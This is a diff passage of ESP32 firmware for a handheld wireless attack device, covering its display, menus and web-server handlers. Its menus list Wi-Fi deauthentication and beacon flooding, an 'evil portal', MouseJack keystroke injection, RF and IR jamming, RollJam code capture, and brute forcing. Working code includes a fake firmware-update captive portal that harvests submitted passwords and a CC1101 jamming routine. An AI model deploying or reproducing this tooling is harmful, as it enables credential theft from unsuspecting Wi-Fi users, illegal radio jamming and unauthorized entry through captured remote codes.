+  serializeJson(doc, json);
+  
+  webSocket.sendTXT(clientNum, json);
+}
+
+void broadcastSystemStatus() {
+  if (!anyWebSocketClientConnected()) return;
+  
+  DynamicJsonDocument doc(512);
+  doc["uptime"] = millis() / 1000;
+  doc["ram"] = esp_get_free_heap_size();
+  doc["mode"] = currentMode;
+  doc["subMode"] = currentSubMode;
+  doc["action"] = actionRunning ? "Running" : "Stopped";
+  doc["packets"] = packetsSentCount;
+  
+  String json;
+  serializeJson(doc, json);
+  
+  webSocket.broadcastTXT(json);
+}
+bool anyWebSocketClientConnected() {
+  for (int i = 0; i < 5; i++) {
+    if (wsClients[i]) return true;
+  }
+  return false;
+}
+
+void handleWebFileDownload(String filename, uint8_t clientNum) {
+  if (SPIFFS.exists(filename)) {
+    File file = SPIFFS.open(filename, FILE_READ);
+    
+    // Send file in chunks via WebSocket
+    const size_t chunkSize = 1024;
+    uint8_t buffer[chunkSize];
+    size_t totalSize = file.size();
+    size_t bytesSent = 0;
+    
+    webSocket.sendTXT(clientNum, "FILE_START:" + filename + ":" + String(totalSize));
+    
+    while (file.available()) {
+      size_t bytesRead = file.read(buffer, chunkSize);
+      webSocket.sendBIN(clientNum, buffer, bytesRead);
+      bytesSent += bytesRead;
+      
+      // Send progress update
+      int progress = (bytesSent * 100) / totalSize;
+      if (progress % 10 == 0) { // Update every 10%
+        webSocket.sendTXT(clientNum, "FILE_PROGRESS:" + String(progress));
+      }
+    }
+    
+    webSocket.sendTXT(clientNum, "FILE_END:" + filename);
+    file.close();
+  } else {
+    webSocket.sendTXT(clientNum, "FILE_ERROR:File not found");
+  }
+}
+
+void handleSystemReboot() {
+  webServer.send(200, "text/plain", "Rebooting...");
+  delay(1000);
+  ESP.restart();
+}
+
+void handleFactoryReset() {
+  if (spiffs_mounted) {
+    SPIFFS.format();
+  }
+  webServer.send(200, "text/plain", "Factory reset complete. Rebooting...");
+  delay(1000);
+  ESP.restart();
+}
+void updateDisplay(){
+  display.clearDisplay();
+  drawHeader();
+  if(actionRunning) {
+    drawActiveScreen();
+  } else {
+    drawMenu();
+  }
+  display.display();
+}
+
+void drawHeader() {
+  display.fillRect(0, 0, 128, 10, BLACK);
+  display.drawLine(0, 10, 127, 10, WHITE);
+  display.setTextSize(1);
+  display.setTextColor(WHITE);
+  display.setCursor(0, 0);
+  
+  switch(currentMode) {
+    case MODE_SYSTEM_INFO: display.print("SYS"); break;
+    case MODE_WIFI: display.print("WIFI"); break;
+    case MODE_NRF: display.print("NRF24"); break;
+    case MODE_RF: display.print("RF"); break;
+    case MODE_IR: display.print("IR"); break;
+    case MODE_STORAGE: display.print("STORAGE"); break;
+  }
+  
+  display.setCursor(128-30, 0);
+  if (heartbeatState) display.print("(*)");
+  else display.print("( )");
+  
+  display.setCursor(128-20, 0);
+  if (actionRunning) display.print("RUN");
+  else display.print("STP");
+}
+
+void drawMenu(){
+  if (statusMessage != "" && millis() - statusMessageTime < 2000) {
+    display.setCursor(25, 30); 
+    display.setTextSize(2); 
+    display.print(statusMessage);
+    if(millis() - statusMessageTime > 1900) statusMessage = "";
+    return;
+  }
+
+  display.setCursor(2, 20);
+  display.setTextSize(2); 
+  String sms = "";
+  bool hwo = true;
+  
+  switch(currentMode) {
+    case MODE_SYSTEM_INFO: 
+      display.setTextSize(1);
+      display.setCursor(0, 20);
+      display.printf("Uptime:%lus\n", millis()/1000);
+      display.printf("Free RAM:%uB\n", esp_get_free_heap_size());
+      display.printf("NRF24:%s\n", nrfConnected ? "OK" : "FAIL");
+      display.printf("CC1101:%s\n", cc1101Connected ? "OK" : "FAIL");
+      return;
+    case MODE_WIFI:
+      switch((WiFiSubMode)currentSubMode) {
+        case WIFI_SCAN: sms = "Scan APs"; break;
+        case WIFI_PACKET_MONITOR: sms = "Pkt Monitor"; break;
+        case WIFI_PROBE_SNIFF: sms = "Probe Sniff"; break;
+        case WIFI_PMKID_SNIFF: sms = "PMKID Sniff"; break;
+        case WIFI_DEAUTH_DETECTOR: sms = "Deauth Alert"; break;
+        case WIFI_BEACON_SPAM: sms = "Beacon Spam"; break;
+        case WIFI_BEACON_RICKROLL: sms = "RickRoll Spam"; break;
+        case WIFI_DEAUTH: sms = "Deauth"; break;
+        case WIFI_MASS_DEAUTH: sms = "Mass Deauth"; break;
+        case WIFI_TARGETED_DEAUTH: sms = "Target Deauth"; break;
+        case WIFI_BEACON_FLOOD: sms = "Beacon Flood"; break;
+        case WIFI_PACKET_INJECT: sms = "Pkt Inject"; break;
+        case WIFI_EVIL_PORTAL: sms = "Evil Portal"; break;
+        case WIFI_WEB_UI: sms = "Web UI"; break;
+      }
+      break;
+    case MODE_NRF:
+      hwo = nrfConnected;
+      switch((NRFSubMode)currentSubMode) {
+        case NRF_SPECTRUM: sms = "Spectrum"; break;
+        case NRF_PROMISC_SNIFF: sms = "Promisc Sniff"; break;
+        case NRF_MOUSE_JACK: sms = "Mouse Jack"; break;
+        case NRF_KEYSTROKE_INJECT: sms = "Keystroke Inj"; break;
+        case NRF_ADDR_FUZZ: sms = "Addr Fuzzer"; break;
+        case NRF_JAMMING: sms = "Jamming"; break;
+        case NRF_CONT_JAM: sms = "Cont Jam"; break;
+        case NRF_CHANNEL_HOP_JAM: sms = "Channel Hop Jam"; break;
+        case NRF_AUTO_EXPLOIT: sms = "Auto Exploit"; break;
+        case NRF_PACKET_ANALYZER: sms = "Pkt Analyzer"; break;
+      }
+      break;
+    case MODE_RF:
+      hwo = cc1101Connected;
+      switch((RFSubMode)currentSubMode) {
+        case RF_SPECTRUM: sms = "Spectrum"; break;
+        case RF_PACKET_ANALYZER: sms = "Analyzer"; break;
+        case RF_REPEATER: sms = "Repeater"; break;
+        case RF_CAPTURE_REPLAY: sms = "Capture/Replay"; break;
+        case RF_ROLL_JAM: sms = "RollJam Atk"; break;
+        case RF_BRUTE_FORCE: sms = "Brute Force"; break;
+        case RF_RAW_TRANSMIT: sms = "Raw Transmit"; break;
+        case RF_JAMMING: sms = "Jamming"; break;
+        case RF_SET_FREQ: sms = String(rfState.currentFreq, 2) + "MHz"; break;
+        case RF_CONT_JAM: sms = "Cont Jam"; break;
+        case RF_PATTERN_JAM: sms = "Pattern Jam"; break;
+        case RF_FREQ_HOP_JAM: sms = "Freq Hop Jam"; break;
+        case RF_AUTO_REPLAY: sms = "Auto Replay"; break;
+      }
+      break;
+    case MODE_IR:
+      switch((IRSubMode)currentSubMode) {
+        case IR_SNIFF_DECODE: sms = "IR Sniffer"; break;
+        case IR_UNIVERSAL_REMOTE: sms = "Univ. Remote"; break;
+        case IR_BRUTE_FORCE: sms = "IR Brute Force"; break;
+        case IR_CLONE_REPLAY: sms = "IR Clone"; break;
+        case IR_JAM_CLONE: sms = "IR Jam/Clone"; break;
+        case IR_SCRAMBLE: sms = "IR Scramble"; break;
+        case IR_LEARN_MACRO: sms = "IR Learn Macro"; break;
+        case IR_CONT_JAM: sms = "IR Cont Jam"; break;
+        case IR_FREQ_HOP: sms = "IR Freq Hop"; break;
+        case IR_MACRO_ATTACK: sms = "IR Macro Attack"; break;
+      }
+      break;
+    case MODE_STORAGE:
+      hwo = spiffs_mounted;
+      switch((StorageSubMode)currentSubMode) {
+        case STORAGE_LIST_FILES: sms = "List Files"; break;
+        case STORAGE_TRANSFER_DATA: sms = "Transfer Data"; break;
+        case STORAGE_SAVE_WIFI: sms = "Save WiFi"; break;
+        case STORAGE_SAVE_IR: sms = "Save IR"; break;
+        case STORAGE_FORMAT: sms = "Format"; break;
+        case STORAGE_UPLOAD_FIRMWARE: sms = "Firmware Update"; break;
+        case STORAGE_WEB_TRANSFER: sms = "Web Transfer"; break;
+        case STORAGE_DATA_EXPORT: sms = "Data Export"; break;
+        case STORAGE_BACKUP: sms = "Backup"; break;
+      }
+      break;
+  }
+  
+  display.println(sms);
+  display.setTextSize(1);
+  
+  if(!hwo) {
+    display.setCursor(10, 45);
+    display.println("HW MODULE FAILED!");
+  } else {
+    display.setCursor(0, 50);
+    display.println("Long Press: Start | Dbl-Click: Next");
+  }
+}
+
+void drawActiveScreen() {
+  display.setTextSize(1);
+  int c = 0;
+  
+  switch(currentMode) {
+    case MODE_WIFI:
+      if((WiFiSubMode)currentSubMode == WIFI_SCAN) { 
+        static int anim_state = 0;
+        display.setCursor(20, 30); 
+        display.setTextSize(2); 
+        display.print("Scanning"); 
+        for(int i=0; i<anim_state; i++) display.print("."); 
+        anim_state = (anim_state+1)%4;
+      } else if((WiFiSubMode)currentSubMode == WIFI_PACKET_MONITOR) { 
+        display.setCursor(0, 18);
+        display.printf("M:%ld C:%ld D:%ld", mgmt_count, ctrl_count, data_count); 
+        for(int i=0; i<5; i++) {
+          display.setCursor(0, 28+(i*7));
+          display.printf("%s %s", packet_history[i].type.c_str(), packet_history[i].mac_src.substring(0,8).c_str());
+        } 
+      } else if((WiFiSubMode)currentSubMode <= WIFI_DEAUTH_DETECTOR) {
+        if((WiFiSubMode)currentSubMode == WIFI_PROBE_SNIFF) c = probeCount;
+        else if((WiFiSubMode)currentSubMode == WIFI_PMKID_SNIFF) c = pmkid_count;
+        else c = deauth_event_count;
+        
+        for(int i=0; i<min(c-listScrollOffset, 5); i++) {
+          int idx = i+listScrollOffset;
+          display.setCursor(0, 18+(i*9));
+          
+          if((WiFiSubMode)currentSubMode == WIFI_PROBE_SNIFF) {
+            char m[18];
+            sprintf(m, "%02X:%02X..%02X", probeList[idx].mac[0], probeList[idx].mac[1], probeList[idx].mac[5]);
+            display.printf("%s->%s", m, probeList[idx].ssid.substring(0,8).c_str());
+          } else if((WiFiSubMode)currentSubMode == WIFI_PMKID_SNIFF) {
+            char m[18];
+            sprintf(m, "%02X..%02X", pmkids[idx].client_mac[4], pmkids[idx].client_mac[5]);
+            display.printf("%s->PMKID Cap", m);
+          } else {
+            char m[18];
+            sprintf(m, "%02X..%02X", deauth_events[idx].mac[4], deauth_events[idx].mac[5]);
+            display.printf("DEAUTH from %s", m);
+          }
+        }
+        
+        if(c > 5) {
+          display.drawRect(125, 18, 2, 45, WHITE);
+          display.fillRect(125, 18+(listScrollOffset*45/c), 2, 45/c, WHITE);
+        }
+      } else if((WiFiSubMode)currentSubMode == WIFI_EVIL_PORTAL || (WiFiSubMode)currentSubMode == WIFI_WEB_UI) {
+        display.setCursor(0, 20);
+        display.printf("AP:%s", ((WiFiSubMode)currentSubMode == WIFI_EVIL_PORTAL) ? portal_ssid : "chongketzey");
+        display.setCursor(0, 32);
+        display.printf("IP:%s", WiFi.softAPIP().toString().c_str());
+        display.setCursor(0, 44);
+        display.printf("Clients:%d", WiFi.softAPgetStationNum());
+        
+        if(captured_creds != "") {
+          display.setCursor(0, 56);
+          display.printf("Cap:%s", captured_creds.substring(0,15).c_str());
+        }
+      } else {
+        display.setCursor(15, 25);
+        display.setTextSize(2);
+        display.print("ATTACKING");
+        display.setTextSize(1);
+        display.setCursor(10, 50);
+        uint8_t ch;
+        wifi_second_chan_t sec;
+        esp_wifi_get_channel(&ch, &sec);
+        display.printf("Ch:%d | Pkts:%lu", ch, packetsSentCount);
+      }
+      break;
+      
+    case MODE_NRF:
+      if((NRFSubMode)currentSubMode == NRF_SPECTRUM) { 
+        enhancedSpectrumAnalyzer(nrfState.signalStrength, nrfState.peakStrength, 126, "2.4GHz SPECTRUM");
+      } else if((NRFSubMode)currentSubMode == NRF_PROMISC_SNIFF) {
+        display.setCursor(0, 18);
+        display.print("Sniffing...");
+        for(int i=0; i<min(nrfState.sniff_result_count, 4); i++) {
+          display.setCursor(0, 28+(i*9));
+          display.printf("Ch:%d Rate:%s", nrfState.sniff_results[i].channel, nrfState.sniff_results[i].data_rate.c_str());
+        }
+      } else if((NRFSubMode)currentSubMode == NRF_PACKET_ANALYZER) {
+        display.setCursor(0, 18);
+        display.print("Packet Analyzer");
+        if(nrfState.last_packet_len > 0) {
+          display.setCursor(0, 28);
+          display.printf("Len:%d Ch:%d", nrfState.last_packet_len, radio.getChannel());
+          display.setCursor(0, 38);
+          String payloadStr = "";
+          for(int i=0; i<min(nrfState.last_packet_len, 8); i++) {
+            char hex[3];
+                      sprintf(hex, "%02X", nrfState.last_packet[i]);
+            payloadStr += hex;
+            if(i < min(nrfState.last_packet_len, 8)-1) payloadStr += " ";
+          }
+          display.print(payloadStr);
+        }
+      } else {
+        display.setCursor(20, 25);
+        display.setTextSize(2);
+        display.print("SENDING");
+        display.setTextSize(1);
+        display.setCursor(10, 50);
+        display.printf("Pkts Sent:%ld", nrfState.packetsSentCount);
+      }
+      break;
+
+    case MODE_RF:
+      if((RFSubMode)currentSubMode == RF_SPECTRUM) { 
+        enhancedSpectrumAnalyzer(rfState.signalStrength, rfState.peakStrength, 256, "SUB-GHZ SPECTRUM");
+      } else if((RFSubMode)currentSubMode == RF_PACKET_ANALYZER) {
+        display.setCursor(0, 20);
+        display.printf("Listening on %.2fMHz", rfState.currentFreq); 
+        display.setCursor(0, 32);
+        display.printf("Last RSSI: %d dBm", rfState.last_rssi); 
+        display.setCursor(0, 44);
+        display.printf("Min/Max Pulse: %d/%d us", rfState.min_pulse, rfState.max_pulse); 
+        display.setCursor(0, 56);
+        display.printf("PPS: %d", rfState.pps_count);
+      } else if((RFSubMode)currentSubMode == RF_REPEATER) { 
+        display.setCursor(20, 25);
+        display.setTextSize(2);
+        display.print("REPEATING");
+        display.setTextSize(1);
+        display.setCursor(10, 50);
+        display.printf("Repeated Pkts:%lu", packetsSentCount);
+      } else if((RFSubMode)currentSubMode == RF_CAPTURE_REPLAY) {
+        display.setCursor(0, 20);
+        display.printf("Captured:%d/%d", rfState.captureCount, CAPTURE_MAX);
+        display.setCursor(0, 35);
+        display.printf("Replayed:%ld", rfState.packetsSentCount);
+      } else if((RFSubMode)currentSubMode == RF_ROLL_JAM) { 
+        display.setTextSize(1);
+        display.setCursor(0, 20); 
+        String s; 
+        switch(rfState.rolljam_state) {
+          case RJ_START: s = "Starting..."; break;
+          case RJ_JAM_1: s = "Jamming..."; break;
+          case RJ_LISTEN_1: s = "Listen for Code 1"; break;
+          case RJ_CAPTURED_1: s = "Code 1 Captured!"; break;
+          case RJ_JAM_2: s = "Jamming again..."; break;
+          case RJ_LISTEN_2: s = "Listen for Code 2"; break;
+          case RJ_CAPTURED_2: s = "Code 2 Captured!"; break;
+          case RJ_REPLAY_1: s = "Replaying Code 1"; break;
+          case RJ_SUCCESS: s = "SUCCESS! Code 2 saved."; break;
+        } 
+        display.print(s);
+      } else if((RFSubMode)currentSubMode == RF_BRUTE_FORCE) {
+        display.setCursor(15, 25);
+        display.setTextSize(2);
+        display.print("BRUTING");
+        display.setTextSize(1);
+        display.setCursor(10, 50);
+        display.printf("Code:0x%06X", rfState.bruteForceCode);
+      } else if((RFSubMode)currentSubMode == RF_AUTO_REPLAY) {
+        display.setCursor(0, 20);
+        display.printf("Auto Replay Mode");
+        display.setCursor(0, 32);
+        display.printf("Captured:%d", rfState.captureCount);
+        display.setCursor(0, 44);
+        display.printf("Replayed:%ld", rfState.packetsSentCount);
+      } else {
+        display.setCursor(15, 25);
+        display.setTextSize(2);
+        display.print(((RFSubMode)currentSubMode == RF_JAMMING) ? "JAMMING" : "SENDING");
+        display.setTextSize(1);
+        display.setCursor(10, 50);
+        display.printf("Pkts Sent:%ld", rfState.packetsSentCount);
+      }
+      break;
+
+    case MODE_IR:
+      if((IRSubMode)currentSubMode == IR_SNIFF_DECODE) {
+        display.setCursor(0, 20);
+        display.printf("Proto:%s", irState.last_protocol.c_str());
+        display.setCursor(0, 30);
+        display.printf("Addr:0x%X Cmd:0x%X", irState.last_address, irState.last_command);
+        display.setCursor(0, 45);
+        display.printf("Code:0x%lX", irState.last_code);
+      } else if ((IRSubMode)currentSubMode == IR_CLONE_REPLAY) { 
+        if(irState.cloned_signal_len == 0) { 
+          display.setCursor(15, 30);
+          display.print("Waiting for signal..."); 
+        } else { 
+          display.setCursor(25, 25); 
+          display.setTextSize(2); 
+          display.print("CLONED");
+          display.setTextSize(1); 
+          display.setCursor(10, 50); 
+          display.printf("Len: %d | Replaying...", irState.cloned_signal_len); 
+        } 
+      } else if ((IRSubMode)currentSubMode == IR_JAM_CLONE) {
+        display.setTextSize(2);
+        display.setCursor(15, 25);
+        if (irState.jam_clone_state == STATE_JAMMING) display.print("JAMMING");
+        else if (irState.jam_clone_state == STATE_LISTENING) display.print("LISTENING");
+        else if (irState.jam_clone_state == STATE_CAPTURED) display.print("CAPTURED");
+        else if (irState.jam_clone_state == STATE_REPLAYING) display.print("REPLAYING");
+      } else if((IRSubMode)currentSubMode == IR_LEARN_MACRO) {
+        display.setCursor(0, 20);
+        display.printf("IR Learn Macro");
+        display.setCursor(0, 32);
+        display.printf("Macros:%d/20", irState.macro_count);
+        display.setCursor(0, 44);
+        if(irState.macro_count > 0) {
+          display.printf("Last:0x%lX", irState.macro_codes[irState.macro_count-1]);
+        }
+      } else {
+        display.setCursor(15, 25);
+        display.setTextSize(2);
+        display.print(((IRSubMode)currentSubMode == IR_BRUTE_FORCE) ? "BRUTING" : "SCRAMBLING");
+        display.setTextSize(1);
+        display.setCursor(10, 50);
+        display.printf("Codes Sent:%lu", packetsSentCount);
+      }
+      break;
+
+    case MODE_STORAGE:
+      if((StorageSubMode)currentSubMode == STORAGE_TRANSFER_DATA) {
+        display.setCursor(0, 20);
+        display.println("Connect phone via OTG");
+        display.println("Open Serial Terminal");
+        display.println("Baud: 115200");
+        display.println("Transferring data...");
+      } else if((StorageSubMode)currentSubMode == STORAGE_UPLOAD_FIRMWARE) {
+        display.setCursor(0, 20);
+        display.println("Firmware Update");
+        display.println("Use Web UI to");
+        display.println("upload firmware");
+      } else if((StorageSubMode)currentSubMode == STORAGE_WEB_TRANSFER) {
+        display.setCursor(0, 20);
+        display.println("Web Transfer Mode");
+        display.setCursor(0, 32);
+        if(dataTransferActive) {
+          display.printf("Transferring: %s", currentTransferFile.substring(0, 15).c_str());
+        } else {
+          display.print("Ready for transfer");
+        }
+      } else if((StorageSubMode)currentSubMode == STORAGE_DATA_EXPORT) {
+        display.setCursor(0, 20);
+        display.println("Data Export");
+        display.setCursor(0, 32);
+        display.println("Preparing data for");
+        display.println("download...");
+      } else if((StorageSubMode)currentSubMode == STORAGE_BACKUP) {
+        display.setCursor(0, 20);
+        display.println("Creating Backup");
+        display.setCursor(0, 32);
+        display.println("Saving all data to");
+        display.println("backup file...");
+      } else {
+        c = file_count; 
+        display.setCursor(0, 18); 
+        display.print("Files on Device:");
+        for(int i=0; i < min(c - listScrollOffset, 5); i++) {
+          int index = i + listScrollOffset;
+          display.setCursor(0, 28 + (i * 7));
+          String short_name = file_list[index];
+          if(short_name.length() > 15) {
+            short_name = short_name.substring(0, 12) + "...";
+          }
+          display.print(short_name);
+        }
+        if(c > 5) { 
+          display.drawRect(125, 18, 2, 45, WHITE);
+          display.fillRect(125, 18+(listScrollOffset*45/c), 2, 45/c, WHITE); 
+        }
+      }
+      break;
+  }
+}
+
+void enhancedSpectrumAnalyzer(int values[], int peak_values[], int num_channels, const char* title) {
+  display.setCursor(2, 18);
+  display.print(title);
+  
+  for (int i = 0; i < SCREEN_WIDTH; i++) {
+    int channel = map(i, 0, SCREEN_WIDTH - 1, 0, num_channels - 1);
+    int h = map(values[channel], 0, 100, 0, 44);
+    
+    if (h > 0) {
+      display.drawLine(i, 63, i, 63 - h, WHITE);
+    }
+    
+    int peak_h = map(peak_values[channel], 0, 100, 0, 44);
+    if (peak_h > 0) {
+      display.drawPixel(i, 63 - peak_h, WHITE);
+    }
+  }
+  
+  display.setCursor(SCREEN_WIDTH - 12, 18);
+  display.print("S:");
+  
+  int max_strength = 0;
+  for (int i = 0; i < num_channels; i++) {
+    if (values[i] > max_strength) max_strength = values[i];
+  }
+  
+  int strength_level = map(max_strength, 0, 100, 1, 5);
+  display.print(strength_level);
+}
+
+void advancedJamming() {
+  switchToHSPI();
+  ELECHOUSE_cc1101.SetTx();
+  
+  // Enhanced jamming with multiple patterns
+  for(int i = 0; i < 8; i++) {
+    ELECHOUSE_cc1101.SendData(rfState.jam_patterns[i], 32);
+    rfState.packetsSentCount++;
+    delayMicroseconds(50);
+  }
+  
+  ELECHOUSE_cc1101.SetRx();
+  switchToVSPI();
+}
+
+void handlePortalRoot() {
+  String page;
+  if (use_custom_html && SPIFFS.exists("/custom_portal.html")) {
+    File file = SPIFFS.open("/custom_portal.html", FILE_READ);
+    page = file.readString();
+    file.close();
+  } else {
+    page = R"=====(
+    <!DOCTYPE html><html><head><title>WiFi Login</title><meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>body{font-family:sans-serif;background:#f0f0f0;text-align:center;margin-top:50px;}div{background:#fff;border-radius:8px;padding:20px;display:inline-block;box-shadow: 0 4px 8px rgba(0,0,0,0.1);}.loader{border:4px solid #f3f3f3;border-top:4px solid #3498db;border-radius:50%;width:30px;height:30px;animation:spin 2s linear infinite;margin:auto;margin-bottom:15px;}@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style></head>
+    <body><div><h2>Updating Firmware...</h2><p>Please keep your device powered on.</p><div class="loader"></div></div></body></html>)=====";
+  }
+  
+  if (webServer.hasArg("password")) {
+    captured_creds = webServer.arg("password");
+    Serial.printf("Captured credential: %s\n", captured_creds.c_str());
+    statusMessage = "Creds Got!";
+    statusMessageTime = millis();
+  }
+  webServer.send(200, "text/html", page);
+}
+
+void handleHTMLToggle() {
+  use_custom_html = !use_custom_html;
+  webServer.send(200, "text/plain", use_custom_html ? "Custom HTML Enabled" : "Default HTML Enabled");
+}
+
+void handleEvilPortalSettings() {
+  if (webServer.hasArg("ssid")) {
+    portal_ssid = webServer.arg("ssid").c_str();
+  }
+  if (webServer.hasArg("custom_html") && webServer.hasArg("html_content")) {
+    File file = SPIFFS.open("/custom_portal.html", FILE_WRITE);
+    file.print(webServer.arg("html_content"));
+    file.close();
+    use_custom_html = true;
+  }
+  webServer.send(200, "text/plain", "Settings updated");
+}
+
+void handleFileUpload() {
+  HTTPUpload& upload = webServer.upload();
+  
+  if (upload.status == UPLOAD_FILE_START) {
+    String filename = upload.filename;
+    if (!filename.startsWith("/")) {
+      filename = "/uploads/" + filename;
+    }
+    
+    // Create directory if needed
+    String path = filename.substring(0, filename.lastIndexOf('/'));
+    if (!SPIFFS.exists(path)) {
+      SPIFFS.mkdir(path);
+    }
+    
+    Serial.printf("Upload: START, filename: %s\n", filename.c_str());
+    
+    // Notify WebSocket clients
+    broadcastUploadStatus("START", filename, 0);
+    
+  } else if (upload.status == UPLOAD_FILE_WRITE) {
+    String filename = upload.filename;
+    if (!filename.startsWith("/")) {
+      filename = "/uploads/" + filename;
+    }
+    
+    File file = SPIFFS.open(filename, FILE_APPEND);
+    if (file) {
+      file.write(upload.buf, upload.currentSize);
+      file.close();
+    }
+    
+    int progress = (upload.totalSize > 0) ? (upload.currentSize * 100 / upload.totalSize) : 0;
+    broadcastUploadStatus("WRITE", filename, progress);
+    
+  } else if (upload.status == UPLOAD_FILE_END) {
+    String filename = upload.filename;
+    if (!filename.startsWith("/")) {
+      filename = "/uploads/" + filename;
+    }
+    
+    Serial.printf("Upload: END, Size: %d\n", upload.totalSize);
+    statusMessage = "Upload Complete: " + String(filename);
+    statusMessageTime = millis();
+    
+    broadcastUploadStatus("END", filename, 100);
+    
+    // Log the upload
+    if (spiffs_mounted) {
+      File logFile = SPIFFS.open("/logs/uploads.log", FILE_APPEND);
+      if (logFile) {
+        logFile.printf("[%lu] Upload: %s, Size: %d\n", 
+                      millis(), filename.c_str(), upload.totalSize);
+        logFile.close();
+      }
+    }
+  }
+}
+
+void broadcastUploadStatus(String status, String filename, int progress) {
+  if (!anyWebSocketClientConnected()) return;
+  
+  DynamicJsonDocument doc(256);
+  doc["type"] = "upload";
+  doc["status"] = status;
+  doc["filename"] = filename;
+  doc["progress"] = progress;
+  doc["timestamp"] = millis();
+  
+  String json;
+  serializeJson(doc, json);
+  
+  webSocket.broadcastTXT(json);
+}
+
+void handleFileDownload() {
+  if (webServer.hasArg("file")) {
+    String filename = webServer.arg("file");
+    
+    if (SPIFFS.exists(filename)) {
+      File file = SPIFFS.open(filename, FILE_READ);
+      
+      webServer.sendHeader("Content-Type", "application/octet-stream");
+      webServer.sendHeader("Content-Disposition", "attachment; filename=" + filename.substring(filename.lastIndexOf('/') + 1));
+      webServer.sendHeader("Connection", "close");
+      webServer.streamFile(file, "application/octet-stream");
+      
+      file.close();
+      
+      // Log the download
+      if (spiffs_mounted) {
+        File logFile = SPIFFS.open("/logs/downloads.log", FILE_APPEND);
+        if (logFile) {
+          logFile.printf("[%lu] Download: %s\n", millis(), filename.c_str());
+          logFile.close();
+        }
+      }
+    } else {
+      webServer.send(404, "text/plain", "File not found");
+    }
+  } else {
+    webServer.send(400, "text/plain", "Filename parameter missing");
+  }
+}
+
+void handleFirmwareUpload() {
+  HTTPUpload& upload = webServer.upload();
+  if(upload.status == UPLOAD_FILE_START) {
+    Serial.printf("Firmware Update: %s\n", upload.filename.c_str());
+    if(!Update.begin(UPDATE_SIZE_UNKNOWN)) {
+      Update.printError(Serial);
+    }
+  } else if(upload.status == UPLOAD_FILE_WRITE) {
+    if(Update.write(upload.buf, upload.currentSize) != upload.currentSize) {
+      Update.printError(Serial);
+    }
+  } else if(upload.status == UPLOAD_FILE_END) {
+    if(Update.end(true)) {
+      Serial.printf("Firmware Update Success: %u\nRebooting...\n", upload.totalSize);
+      webServer.sendHeader("Location", "/");
+      webServer.send(303);
+      ESP.restart();
+    } else {
+      Update.printError(Serial);
+    }
+  }
+}
+
+// ===== MISSING FUNCTION IMPLEMENTATIONS =====
+
+void handleSpectrumDataJSON() {
+  if (webServer.method() == HTTP_GET) {
+    DynamicJsonDocument doc(1024);
+    
+    // Add NRF24 spectrum data
+    JsonArray nrfData = doc.createNestedArray("nrf24");
+    for (int i = 0; i < 126; i += 5) {
+      nrfData.add(nrfState.signalStrength[i]);
+    }
+    
+    // Add RF spectrum data
+    JsonArray rfData = doc.createNestedArray("rf");
+    for (int i = 0; i < 256; i += 10) {
+      rfData.add(rfState.signalStrength[i]);
+    }
+    
+    String json;
+    serializeJson(doc, json);
+    webServer.send(200, "application/json", json);
+  }
+}
+
+void handleDataTransfer() {
+  if (webServer.method() == HTTP_GET) {
+    webServer.send(200, "text/html", 
+      "<html><body><h1>Data Transfer</h1><p>Use Web UI for file management</p></body></html>");
+  }
+}
+
+void handleDownloadFile() {
+  if (webServer.hasArg("file")) {
+    String filename = webServer.arg("file");
+    webServer.send(200, "text/plain", "Download: " + filename);
+  } else {
+    webServer.send(400, "text/plain", "Missing file parameter");
+  }
+}
+
+void handleDeleteFile() {
+  if (webServer.hasArg("file")) {
+    String filename = webServer.arg("file");
+    webServer.send(200, "text/plain", "Delete: " + filename);
+  } else {
+    webServer.send(400, "text/plain", "Missing file parameter");
+  }
+}
+
+void handleSpectrumWeb() {
+  webServer.send(200, "text/html", "<html><body><h1>Spectrum Analyzer</h1><p>Placeholder</p></body></html>");
+}
+// ===== MEMORY MONITORING FUNCTION =====
+void checkMemory() {
+  static unsigned long lastCheck = 0;
+  if (millis() - lastCheck > 5000) {
+    Serial.printf("[Memory] Free: %d bytes\n", esp_get_free_heap_size());
+    lastCheck = millis();
+  }
+}
